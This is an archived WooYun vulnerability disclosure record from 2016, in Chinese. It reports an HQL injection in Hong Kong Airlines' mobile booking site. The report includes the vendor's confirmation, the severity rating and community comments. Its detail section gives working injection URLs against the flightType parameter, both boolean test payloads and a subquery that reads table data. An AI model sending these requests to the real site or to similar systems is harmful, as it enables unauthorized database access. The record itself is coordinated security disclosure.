{"id": 87933, "wybug_id": "wooyun-2016-0205054", "wybug_title": "香港航空某处HQL注入                                      ", "wybug_corp": "香港航空", "wybug_author": "V1ct0r", "wybug_date": "2016-05-04 19:53", "wybug_open_date": "2016-06-20 16:20", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-20：\t细节向公众公开  简要描述： 此处较为鸡肋，就当小小记录一下... 详细说明：  关于HQL注入Drops里面有一篇文章：http://drops.wooyun.org/tips/748HQL的一个案例： WooYun: 优学院某处HQL注入 问题发生在香港航空的手机版：https://m.hongkongairlines.com/https://m.hongkongairlines.com/ci/index.php/special_ticket/recommend?classType=&ctoke=5dbb73a5f433f29015f1405a6a9ef8ec_EN&dstCity=&email=&flightType=1%27%22&lang=EN&orgCity=&protocalnum=&returnDate=&takeoffDate=&tripType=\n\n根据错误信息可知可能存在HQL注入.注入点在：flightType构造测试：https://m.hongkongairlines.com/ci/index.php/special_ticket/recommend?classType=&ctoke=5dbb73a5f433f29015f1405a6a9ef8ec_EN&dstCity=&email=&flightType=1%27%0Aand%0A%271%27%3E%270&lang=EN&orgCity=&protocalnum=&returnDate=&takeoffDate=&tripType=\n\nhttps://m.hongkongairlines.com/ci/index.php/special_ticket/recommend?classType=&ctoke=5dbb73a5f433f29015f1405a6a9ef8ec_EN&dstCity=&email=&flightType=1%27%0Aand%0A%271%27%3E%275&lang=EN&orgCity=&protocalnum=&returnDate=&takeoffDate=&tripType=\n\n可验证注入存在.首先我们可以参考： WooYun: 优学院某处HQL注入 来获取user信息.由之前的报错信息，可以知道当前表的名字：***.***.***.aio.flight.model.FpRecommendFlight然后可以读取当前表的数据：https://m.hongkongairlines.com/ci/index.php/special_ticket/recommend?classType=&ctoke=5dbb73a5f433f29015f1405a6a9ef8ec_EN&dstCity=&email=&flightType=1%27%0Aand%0A(select%0Acount(id)%0Afrom%0A***.***.***.aio.flight.model.FpRecommendFlight%0Awhere%0Arownum%3C10)%3E0%0Aand%0A%271%27%3E%270&lang=EN&orgCity=&protocalnum=&returnDate=&takeoffDate=&tripType=\n\n借助其他地方的报错信息，我们还得到了另一个表的名字：***.***.***.aio.common.model.MContent可按照上面方式来读取...但是如何获取其它表名呢？laterain师傅告诉我：可能它将对表的操作都放在了Model层里面，所以不仅需要找到表名还得找到对应的Model名称也就是说我们只有可能通过一些其他的方式来获得更多对应的名字（如这里的报错信息）我觉得这样确实显得非常鸡肋，但是在某些特殊情况下，例如当前表恰好存了我们想获取或敏感的信息时，还是会比较有用了.   漏洞证明：  如上   修复方案：  过滤   版权声明：转载请注明来源 V1ct0r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-05-06 16:13 厂商回复： 谢谢，我们会立即安排整改。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-04 20:38 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:307 漏洞数:70        | baozisec)\t\t \n  航空杀手    \n     2016-05-04 22:23 |    \t\tV1ct0r \t\t\t( 普通白帽子  |\t\t\t        Rank:375 漏洞数:81        | 生活不止眼前的苟且,还有黑客和远方.)\t\t \n  @牛肉包子 (●´ω｀●)φ     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}